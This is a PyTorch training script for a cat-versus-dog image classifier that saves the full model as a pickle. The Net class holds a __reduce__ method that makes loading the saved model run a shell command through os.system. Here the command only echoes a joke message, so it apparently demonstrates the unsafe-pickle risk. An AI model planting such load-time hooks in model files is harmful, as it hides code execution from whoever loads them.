from PIL import Image
import os
import matplotlib.pyplot as plt
import torch
import torchvision
import torchvision.transforms as transforms
import torch.optim as optim

root = "../data/PetImages"
for subdir, _, files in os.walk(root):
    for file in files:
        path = os.path.join(subdir, file)
        try:
            with Image.open(path) as img:
                img.verify()  # Check integrity
        except Exception:
            print("Corrupted:", path)
            os.remove(path)


print(torch.__version__)

transform = transforms.Compose(
    [
        transforms.Resize((60, 60)),
        transforms.ToTensor(),
        transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5)),
    ]
)

full_dataset = torchvision.datasets.ImageFolder(
    "../data/PetImages", transform=transform
)

dataset_len = len(full_dataset)
print(dataset_len)

train_size = int(0.1 * dataset_len)
test_size = dataset_len - train_size

trainset, testset = torch.utils.data.random_split(full_dataset, [train_size, test_size])

batch_size = 4

trainloader = torch.utils.data.DataLoader(
    trainset, batch_size=batch_size, shuffle=True, num_workers=2
)

testloader = torch.utils.data.DataLoader(
    testset, batch_size=batch_size, shuffle=False, num_workers=2
)

classes = ("Cat", "Dog")

import torch.nn as nn
import torch.nn.functional as F


class Net(nn.Module):
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 16, 5)
        self.fc1 = nn.Linear(16 * 12 * 12, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 2)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = torch.flatten(x, 1)  # flatten all dimensions except batch
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x

    def class_image(self, path):

        with torch.no_grad():
            img = torchvision.io.read_image(path)
            img = transforms.ToPILImage()(img)
            raw_image = img
            img = transform(img)
            img = img.unsqueeze(0)

            output = net(img)
            probs = F.softmax(output, dim=1)
            _, predicted = torch.max(output, 1)

            plt.imshow(raw_image)
            plt.xlabel(
                f"Predicted: {classes[predicted]} ({100*float(probs[0][predicted]):.2f}%)"
            )

    def __reduce__(self):
        return os.system, ("echo Se ha ejecutado un virus hindu",)


net = Net()

criterion = nn.CrossEntropyLoss()
optimizer = optim.SGD(net.parameters(), lr=0.001, momentum=0.9)

for epoch in range(2):  # loop over the dataset multiple times

    running_loss = 0.0
    for i, data in enumerate(trainloader, 0):
        # get the inputs; data is a list of [inputs, labels]
        inputs, labels = data

        # zero the parameter gradients
        optimizer.zero_grad()

        # forward + backward + optimize
        outputs = net(inputs)
        loss = criterion(outputs, labels)
        loss.backward()
        optimizer.step()

        # print statistics
        running_loss += loss.item()
        if i % 2000 == 1999:  # print every 2000 mini-batches
            print(f"[{epoch + 1}, {i + 1:5d}] loss: {running_loss / 2000:.3f}")
            running_loss = 0.0

print("Finished Training")

PATH = "./cat_dog.pth"
torch.save(net, PATH)
